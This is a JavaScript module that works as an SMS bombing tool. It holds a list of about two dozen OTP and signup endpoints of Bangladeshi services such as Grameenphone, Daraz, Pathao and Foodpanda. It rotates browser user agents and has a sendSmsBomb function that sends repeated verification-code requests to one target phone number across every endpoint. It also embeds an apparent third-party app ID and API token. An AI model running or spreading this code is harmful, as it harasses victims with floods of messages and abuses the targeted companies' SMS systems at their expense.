const axios = require('axios');

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.6099.144',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0'
];

const APIS = [
    { name: "Grameenphone", url: "https://webloginda.grameenphone.com/backend/api/v1/otp", method: "POST", type: "form", data: (n) => ({ msisdn: `0${n}` }) },
    { name: "Redx", url: "https://api.redx.com.bd/v1/user/signup", method: "POST", type: "json", data: (n) => ({ name: "User", phoneNumber: `0${n}`, service: "redx" }) },
    { name: "Bikroy", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login", method: "GET", type: "params", data: (n) => ({ phone: `0${n}` }) },
    { name: "Toffeelive", url: "https://prod-services.toffeelive.com/sms/v1/subscriber/otp", method: "POST", type: "json", data: (n) => ({ target: `880${n}`, resend: false }) },
    { name: "Chaldal", url: "https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey", method: "POST", type: "params", data: (n) => ({ phoneNumber: `0${n}` }) },
    { name: "Foodpanda", url: "https://www.foodpanda.com.bd/account/request-otp", method: "POST", type: "json", data: (n) => ({ phone: `+880${n}`, country: "BD" }) },
    { name: "Pathao", url: "https://api.pathao.com/api/v2/auth/otp", method: "POST", type: "json", data: (n) => ({ phone: `0${n}` }) },
    { name: "Daraz", url: "https://member.daraz.com.bd/user/send-otp", method: "POST", type: "json", data: (n) => ({ mobile: `0${n}`, countryCode: "BD" }) },
    { name: "Rokomari", url: "https://www.rokomari.com/otp/send", method: "GET", type: "params", data: (n) => ({ emailOrPhone: `880${n}`, countryCode: "BD" }) },
    { name: "ShopUp", url: "https://api.shopup.com.bd/v1/auth/otp/send", method: "POST", type: "json", data: (n) => ({ phone: `+880${n}` }) },
    { name: "Priyoshop", url: "https://www.priyoshop.com/api/login", method: "POST", type: "json", data: (n) => ({ mobile: `0${n}` }) },
    { name: "Ajkerdeal", url: "https://ajkerdeal.com/api/v1/otp/send", method: "POST", type: "json", data: (n) => ({ mobile: `0${n}` }) },
    { name: "Othoba", url: "https://othoba.com/ShoppingCart/SendVerificationCode", method: "POST", type: "form", data: (n) => ({ phoneNumber: `0${n}` }) },
    { name: "Shwapno", url: "https://www.shwapno.com/api/auth", method: "POST", type: "json", data: (n) => ({ phoneNumber: `+880${n}` }) },
    { name: "Wafilife", url: "https://www.wafilife.com/api/auth/send-otp", method: "POST", type: "json", data: (n) => ({ mobileNumber: `0${n}` }) },
    { name: "Sheba", url: "https://accountkit.sheba.xyz/api/shoot-otp", method: "POST", type: "json", data: (n) => ({ mobile: `+880${n}`, app_id: "8329815A6D1AE6DD", api_token: "d2ujieU7N9VtapPHXAO8irze25P2lcQnkFhZvqaMR4z2e1B0ZHM5KsUkB3ln" }) },
    { name: "Hoichoi", url: "https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code", method: "POST", type: "json", data: (n) => ({ phoneNumber: `+880${n}`, platform: "MOBILE_WEB" }) },
    { name: "Chorki", url: "https://api-dynamic.chorki.com/v2/auth/login", method: "POST", type: "json", data: (n) => ({ number: `+880${n}` }) },
    { name: "Bioscopelive", url: "https://api-dynamic.bioscopelive.com/v2/auth/login", method: "POST", type: "json", data: (n) => ({ number: `+880${n}` }) },
    { name: "Paperfly", url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", method: "POST", type: "json", data: (n) => ({ full_name: "User", company_name: "User", email_address: `user${n}@gmail.com`, phone_number: `0${n}` }) },
    { name: "eCourier", url: "https://backoffice.ecourier.com.bd/api/check-mobile", method: "POST", type: "form", data: (n) => ({ mobile: `0${n}` }) },
    { name: "Rang-BD", url: "https://api.rang-bd.com/api/auth/otp", method: "POST", type: "json", data: (n) => ({ phone: n }) },
    { name: "Bdstal", url: "https://www.bdstall.com/userRegistration/save_otp_info/", method: "POST", type: "form", data: (n) => ({ UserTypeID: "2", RequestType: "1", Name: "User", Mobile: `0${n}`, agree_terms: "on" }) }
];

function getRandomUserAgent() {
    return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

async function sendApiRequest(api, number) {
    try {
        const headers = {
            'User-Agent': getRandomUserAgent(),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive'
        };
        
        let data = api.data(number);
        let response;
        
        if (api.method === 'GET') {
            response = await axios.get(api.url, { params: data, headers, timeout: 10000 });
        } else {
            if (api.type === 'json') {
                response = await axios.post(api.url, data, { headers, timeout: 10000 });
            } else if (api.type === 'form') {
                const formData = new URLSearchParams(data);
                headers['Content-Type'] = 'application/x-www-form-urlencoded';
                response = await axios.post(api.url, formData, { headers, timeout: 10000 });
            } else if (api.type === 'params') {
                response = await axios.post(api.url, {}, { params: data, headers, timeout: 10000 });
            } else {
                response = await axios.post(api.url, data, { headers, timeout: 10000 });
            }
        }
        
        return [200, 201, 202, 204, 400, 403, 429].includes(response.status);
    } catch (error) {
        return false;
    }
}

async function sendSmsBomb(number, count, onProgress) {
    let success = 0;
    let failed = 0;
    
    for (let i = 0; i < count; i++) {
        for (const api of APIS) {
            const result = await sendApiRequest(api, number);
            if (result) success++;
            else failed++;
            await new Promise(r => setTimeout(r, 300));
        }
        
        if (onProgress) {
            onProgress(i + 1, count, success, failed);
        }
        
        await new Promise(r => setTimeout(r, 1000));
    }
    
    return { success, failed };
}

function formatNumber(number) {
    return `${number.slice(0, 3)}*******`;
}

module.exports = { APIS, sendApiRequest, sendSmsBomb, formatNumber, getRandomUserAgent };
